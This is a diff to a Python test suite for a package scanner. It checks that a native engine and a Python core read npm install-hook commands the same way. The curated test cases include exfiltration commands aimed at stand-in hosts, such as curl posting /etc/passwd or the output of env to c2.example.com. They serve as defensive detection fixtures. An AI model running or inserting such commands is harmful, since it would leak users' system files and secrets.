@@ -1,40 +1,29 @@
 """Engine parity for reading an install hook's command as a program (0.1.8):
-the npm engine's js/src/lib/hooks.js (hookCommandRisk, shParse,
-hookInlineCode) against lazaret.scanner.core (hook_command_risk, _sh_parse,
-_hook_inline_code), case by case in one node process, on realistic hook
-commands and on a seeded random corpus built from the pieces the reader
-looks at: separators, quotes, escapes, $(…) and `…`, redirections, the
-network commands and their options, wrappers, keywords, the commands that
-report on the machine, environment variables, addresses, and non-ASCII
-text (é, ſ and the Kelvin sign, İ, U+0085, U+00A0, a character outside the
-BMP). Each command is read with its output thrown away and kept (a
-binding.gyp command expansion).
+the native engine (crates/lazaret-engine: shell.rs hook_command_risk,
+sh_parse, hook_inline_code; the npm package runs it as WebAssembly) against
+lazaret.scanner.core (hook_command_risk, _sh_parse, _hook_inline_code),
+case by case, on realistic hook commands and on a seeded random corpus built
+from the pieces the reader looks at: separators, quotes, escapes, $(…) and
+`…`, redirections, the network commands and their options, wrappers,
+keywords, the commands that report on the machine, environment variables,
+addresses, and non-ASCII text (é, ſ and the Kelvin sign, İ, U+0085, U+00A0,
+a character outside the BMP). Each command is read with its output thrown
+away and kept (a binding.gyp command expansion). (Until 0.1.9 this held the
+npm engine's JavaScript twin, js/src/lib/hooks.js, to core.)
 
 All text is inert: hosts are reserved names or private addresses, and
-nothing is executed. Skipped where node is missing.
+nothing is executed. The native engine runs in a thread while core reads the
+cases. Skipped where the native library is not built.
 """
 import json
-import os
 import random
-import shutil
-import subprocess
+import threading
 import unittest
 
-from lazaret.scanner import core
-from tests import _support
+from lazaret.scanner import _native, core
 
-NODE = shutil.which("node")
-HOOKS_JS = os.path.join(_support.REPO_ROOT, "js", "src", "lib", "hooks.js")
-NPM = """
-import { readFileSync } from "node:fs";
-import { pathToFileURL } from "node:url";
-const h = await import(pathToFileURL(process.argv[1]).href);
-const cases = JSON.parse(readFileSync(0, "utf8"));
-const results = cases.map((s) => [h.hookCommandRisk(s), h.hookCommandRisk(s, true),
-  h.shParse(s).map((c) => [c.words, c.subs, c.redirs, c.pipeIn, c.pipeOut, c.after]), h.hookInlineCode(s)]);
-process.stdout.write(JSON.stringify(results));
-"""
 FIELDS = ("hook_command_risk", "hook_command_risk (output kept)", "_sh_parse", "_hook_inline_code")
+CHUNK = 1000
 
 CURATED = [
     "curl -X POST --data @/etc/passwd https://c2.example.com/a", 'curl -d "$(env)" https://c2.example.com',
@@ -153,30 +142,41 @@ def core_view(text):
             core._hook_inline_code(text, core._HookWalk())]
 
 
-@unittest.skipUnless(NODE, "node is not installed")
+def native_views(cases, box):
+    views = []
+    try:
+        for i in range(0, len(cases), CHUNK):
+            calls = [["hook_command_view", {}, text] for text in cases[i:i + CHUNK]]
+            for r in _native.call("batch", {"calls": calls, "threads": 2}):
+                views.append(r.get("ok", r))
+    except Exception as e:                            # reported by the test, not lost in the thread
+        box["error"] = repr(e)
+    box["views"] = views
+
+
+@unittest.skipUnless(_native.available(), f"native engine not built ({_native.load_error()})")
 class HookCommandParityTests(unittest.TestCase):
     maxDiff = None
 
     @classmethod
     def setUpClass(cls):
         cls.cases = corpus()
-        p = subprocess.Popen([NODE, "--input-type=module", "-e", NPM, HOOKS_JS], stdin=subprocess.PIPE,
-                             stdout=subprocess.PIPE, stderr=subprocess.PIPE, encoding="utf-8", errors="replace")
-        import threading
         box = {}
-        worker = threading.Thread(target=lambda: box.update(out=p.communicate(json.dumps(cls.cases), timeout=40)))
+        worker = threading.Thread(target=native_views, args=(cls.cases, box))
         worker.start()
         cls.views = [core_view(text) for text in cls.cases]
         worker.join()
-        stdout, stderr = box["out"]
-        if p.returncode:
-            raise AssertionError(f"node exited {p.returncode}: {stderr[-2000:]}")
-        cls.results = json.loads(stdout)
+        cls.error = box.get("error")
+        cls.results = box.get("views", [])
 
     def test_every_case_agrees(self):
+        self.assertIsNone(self.error)
         self.assertEqual(len(self.results), len(self.cases))
         found = []
         for text, want, got in zip(self.cases, self.views, self.results):
+            if not isinstance(got, list):
+                found.append((text, "(call)", None, got))
+                continue
             for field, a, b in zip(FIELDS, want, got):
                 if a != b:
                     found.append((text, field, a, b))
